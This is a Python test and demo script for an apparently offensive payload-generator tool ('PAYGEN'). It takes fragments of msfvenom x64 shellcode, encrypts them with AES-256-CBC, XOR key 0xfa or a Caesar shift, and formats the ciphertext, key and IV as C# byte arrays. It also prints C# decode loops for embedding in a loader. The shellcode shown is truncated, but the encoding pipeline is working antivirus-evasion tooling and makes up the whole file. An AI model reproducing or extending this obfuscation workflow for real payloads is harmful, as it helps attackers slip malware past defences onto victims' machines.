#!/usr/bin/env python3
"""
Comprehensive AES encryption test with real-world workflow examples.
"""

import sys
import json
import subprocess
import base64
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / 'src'))

from src.core.config import ConfigManager
from src.core.preprocessor import PreprocessingOrchestrator


def test_aes_encryption():
    """Test AES encryption preprocessor."""
    print("=" * 70)
    print("TEST: AES-256-CBC Encryption")
    print("=" * 70)
    
    # Sample msfvenom shellcode (first 32 bytes for demo)
    shellcode = bytes([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52
    ])
    
    config = ConfigManager()
    orchestrator = PreprocessingOrchestrator(config)
    
    # Encode to base64 for input
    shellcode_b64 = base64.b64encode(shellcode).decode('ascii')
    
    preprocessing_steps = [
        {
            'type': 'script',
            'name': 'aes_encryption',
            'script': 'aes_encrypt.py',
            'args': {
                'data': shellcode_b64,
                'key': 'auto',
                'iv': 'auto'
            },
            'output_var': 'aes_result'
        }
    ]
    
    parameters = {}
    
    try:
        result = orchestrator.execute(preprocessing_steps, parameters)
        print("✓ AES encryption successful\n")
        
        aes_data = result.get('aes_result')
        if isinstance(aes_data, dict):
            print(f"Original size: {len(shellcode)} bytes")
            print(f"Encrypted size: {aes_data.get('size')} bytes")
            print(f"Key (hex): {aes_data.get('key_hex')}")
            print(f"IV (hex): {aes_data.get('iv_hex')}")
            print(f"\nEncrypted (base64): {aes_data.get('encrypted')[:60]}...")
        
        print()
        return True, aes_data
    except Exception as e:
        print(f"✗ AES encryption failed: {e}\n")
        return False, None


def demonstrate_full_workflow():
    """Demonstrate complete workflow: shellcode → encrypt → format for C#"""
    print("=" * 70)
    print("DEMO: Complete Workflow (Shellcode → AES → C# Format)")
    print("=" * 70)
    
    # Sample shellcode (subset for demo)
    shellcode = bytes([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a
    ])
    
    config = ConfigManager()
    orchestrator = PreprocessingOrchestrator(config)
    
    shellcode_b64 = base64.b64encode(shellcode).decode('ascii')
    
    # Multi-step preprocessing: AES encrypt → format as C# byte array
    preprocessing_steps = [
        # Step 1: AES encrypt the shellcode
        {
            'type': 'script',
            'name': 'aes_encryption',
            'script': 'aes_encrypt.py',
            'args': {
                'data': shellcode_b64,
                'key': 'auto',
                'iv': 'auto'
            },
            'output_var': 'aes_result'
        },
        # Step 2: Format encrypted data as C# byte array
        {
            'type': 'script',
            'name': 'format_csharp',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ aes_result.encrypted }}',
                'var_name': 'encryptedPayload',
                'bytes_per_line': 15
            },
            'output_var': 'csharp_payload'
        },
        # Step 3: Format AES key as C# byte array
        {
            'type': 'script',
            'name': 'format_key',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ aes_result.key }}',
                'var_name': 'aesKey',
                'bytes_per_line': 16
            },
            'output_var': 'csharp_key'
        },
        # Step 4: Format AES IV as C# byte array
        {
            'type': 'script',
            'name': 'format_iv',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ aes_result.iv }}',
                'var_name': 'aesIV',
                'bytes_per_line': 16
            },
            'output_var': 'csharp_iv'
        }
    ]
    
    try:
        result = orchestrator.execute(preprocessing_steps, parameters={})
        print("✓ Full workflow successful\n")
        
        print("=" * 70)
        print("C# CODE OUTPUT:")
        print("=" * 70)
        print(result['csharp_key'])
        print()
        print(result['csharp_iv'])
        print()
        print(result['csharp_payload'])
        print()
        
        return True
    except Exception as e:
        print(f"✗ Workflow failed: {e}\n")
        import traceback
        traceback.print_exc()
        return False


def demonstrate_xor_workflow():
    """Demonstrate XOR workflow similar to your C# example."""
    print("=" * 70)
    print("DEMO: XOR Workflow (Like your C# example)")
    print("=" * 70)
    
    # Same sample shellcode
    shellcode = bytes([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a
    ])
    
    config = ConfigManager()
    orchestrator = PreprocessingOrchestrator(config)
    
    shellcode_b64 = base64.b64encode(shellcode).decode('ascii')
    
    # XOR with fixed key (0xfa like your example)
    preprocessing_steps = [
        # Step 1: XOR encrypt with fixed key 0xfa
        {
            'type': 'script',
            'name': 'xor_encryption',
            'script': 'xor_encrypt.py',
            'args': {
                'data': shellcode_b64,
                'key': 'fa'  # Fixed key like your example
            },
            'output_var': 'xor_result'
        },
        # Step 2: Format as C# byte array
        {
            'type': 'script',
            'name': 'format_csharp',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ xor_result.encrypted }}',
                'var_name': 'buf',
                'bytes_per_line': 15
            },
            'output_var': 'csharp_payload'
        }
    ]
    
    try:
        result = orchestrator.execute(preprocessing_steps, parameters={})
        print("✓ XOR workflow successful\n")
        
        print("=" * 70)
        print("C# CODE OUTPUT (XOR with key 0xfa):")
        print("=" * 70)
        print(result['csharp_payload'])
        print("\n// Decode in C#:")
        print("for (int i = 0; i < buf.Length; i++)")
        print("{")
        print("    buf[i] = (byte)((uint)buf[i] ^ 0xfa);")
        print("}")
        print()
        
        return True
    except Exception as e:
        print(f"✗ Workflow failed: {e}\n")
        import traceback
        traceback.print_exc()
        return False


def demonstrate_caesar_workflow():
    """Demonstrate Caesar cipher workflow."""
    print("=" * 70)
    print("DEMO: Caesar Cipher Workflow (ROT13)")
    print("=" * 70)
    
    shellcode = bytes([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2
    ])
    
    config = ConfigManager()
    orchestrator = PreprocessingOrchestrator(config)
    
    shellcode_b64 = base64.b64encode(shellcode).decode('ascii')
    
    preprocessing_steps = [
        # Step 1: Caesar cipher with shift 13 (ROT13)
        {
            'type': 'script',
            'name': 'caesar_encryption',
            'script': 'caesar_cipher.py',
            'args': {
                'data': shellcode_b64,
                'shift': 13
            },
            'output_var': 'caesar_result'
        },
        # Step 2: Format as C# byte array
        {
            'type': 'script',
            'name': 'format_csharp',
            'script': 'format_csharp.py',
            'args': {
                'data': '{{ caesar_result.encrypted }}',
                'var_name': 'caesarPayload',
                'bytes_per_line': 15
            },
            'output_var': 'csharp_payload'
        }
    ]
    
    try:
        result = orchestrator.execute(preprocessing_steps, parameters={})
        print("✓ Caesar cipher workflow successful\n")
        
        caesar_data = result.get('caesar_result')
        print(f"Shift value: {caesar_data.get('shift')}")
        print()
        print("=" * 70)
        print("C# CODE OUTPUT:")
        print("=" * 70)
        print(result['csharp_payload'])
        print("\n// Decode in C#:")
        print("for (int i = 0; i < caesarPayload.Length; i++)")
        print("{")
        print("    caesarPayload[i] = (byte)((caesarPayload[i] - 13 + 256) % 256);")
        print("}")
        print()
        
        return True
    except Exception as e:
        print(f"✗ Workflow failed: {e}\n")
        import traceback
        traceback.print_exc()
        return False


def main():
    """Run all demonstrations."""
    print("\n")
    print("╔" + "═" * 68 + "╗")
    print("║" + " " * 10 + "PAYGEN PREPROCESSOR COMPREHENSIVE DEMOS" + " " * 19 + "║")
    print("╚" + "═" * 68 + "╝")
    print()
    
    results = []
    
    # Test 1: Basic AES
    success, aes_data = test_aes_encryption()
    results.append(("AES Encryption", success))
    
    # Test 2: Full AES workflow
    results.append(("Full AES Workflow", demonstrate_full_workflow()))
    
    # Test 3: XOR workflow (like your C# example)
    results.append(("XOR Workflow", demonstrate_xor_workflow()))
    
    # Test 4: Caesar cipher workflow
    results.append(("Caesar Cipher Workflow", demonstrate_caesar_workflow()))
    
    # Summary
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    passed = sum(1 for _, success in results if success)
    total = len(results)
    
    for name, success in results:
        status = "✓ PASS" if success else "✗ FAIL"
        print(f"{status}: {name}")
    
    print()
    print(f"Results: {passed}/{total} demos completed successfully")
    print()
    
    if passed == total:
        print("🎉 All demonstrations successful!")
        return 0
    else:
        print("❌ Some demonstrations failed")
        return 1


if __name__ == "__main__":
    sys.exit(main())
